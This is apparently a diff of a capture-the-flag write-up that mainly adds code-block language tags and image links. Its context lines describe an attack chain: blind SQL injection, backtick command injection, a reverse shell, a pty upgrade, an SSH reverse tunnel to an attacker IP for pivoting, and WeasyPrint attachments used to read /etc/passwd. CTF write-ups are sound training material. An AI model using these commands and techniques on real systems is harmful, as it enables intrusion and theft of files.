@@ -46,6 +46,7 @@ and i got the valid zlib file, and the link is `https://bit.do/h1therm` is a sho
 
 First i try to decompile the apk using `jadx` it takes me a while to understand the application workflow, the request and response to the backend server is encrypted by an `AES` but the flaws is they stored the secret key hardcoded in the apk
 
+        java
         protected Response<String> parseNetworkResponse(NetworkResponse networkResponse) {
             try {
                 Object decode = Base64.decode(new String(networkResponse.data), 0);
@@ -159,6 +160,7 @@ so i able to re-implement the encrypt/decrypt function and able to send an plain
 
 after doing some fuzzing i found that the application is vulnerable to an blind sql injection boolean-based , so i made a python scripts to automate the exploit.
 
+    python
     import requests
     import re
     from StringIO import StringIO
@@ -278,6 +280,7 @@ after trying to understand the application, i notice a difference when send a va
 
 the flask app is simply take an user&password and then encrypt the value using javascript function provided in the target application.
 
+    python
     import requests
     import string
     from tqdm import tqdm
@@ -349,7 +352,7 @@ After  strugling around i found that `http://104.196.12.98/update?port=80` have 
 
 the `update_host` parameter is vulnerable to Remote Code Execution we can execute any arbitary code just by using a backtick.
 
-\[RCE1\]
+![](/uploads/rce1.PNG)
 
 create a reverse shell using python
 
@@ -359,7 +362,7 @@ and then `python -c 'import pty;pty.spawn("/bin/bash")'` to spawn a TTY, I reali
 
     ssh -v -o PreferredAuthentications=password -o PubkeyAuthentication=no -o StrictHostKeyChecking=no -fN -R IP_ADDR:8663:172.28.0.3:80 abdilahrf@IP_ADDR
 
-\[ACCOUNTING\]
+![](/uploads/accounting.PNG)
 
 And again the application is behave diferently when i try to inject the parameter password with SQL Injection, after 2 days for looking any working exploits i just realize another way to get in to the application in [http://IP_ADDR:8663/invoices](http://IP_ADDR:8663/invoices) they have an HTML Comment to [http://IP_ADDR:8663/invoices/new](http://IP_ADDR:8663/invoices/new) which doesn't ask for any authentication, so the authentication is an rabbit hole 100%.
 
@@ -371,13 +374,13 @@ to close tag i can use `<script/style>` so we can close the style tag and do som
 
 tried to embed an image and i got response from the server which say the user agent `weasyprint 44`
 
-\[WEASYPRINT\]
+![](/uploads/weasyprint.jpg)
 
 after reading the github repository to get an idea how `weasyprint` work i found that, they didn't support javascript at all so the attack vector using javascript is gone, and also for render the `SVG` they using an `CairoSVG` which is already use `defusedxml` so we cannot do an `XXE` too here.
 
 struggling around and found that we able to abuse the feature from `weasypdf`
 
-\[FEATURE\]
+![](/uploads/feature.PNG)
 
 that feature is allow us to embed any file to the pdf, so i try to embed /etc/passwd using this payload :
 
@@ -488,4 +491,4 @@ reading `/app/main.py` give us the application code.
     Congratulations again, and I'm sorry for the red herrings. :)
     """
 
-\[SOLVED\]
+![](/uploads/solved.PNG)
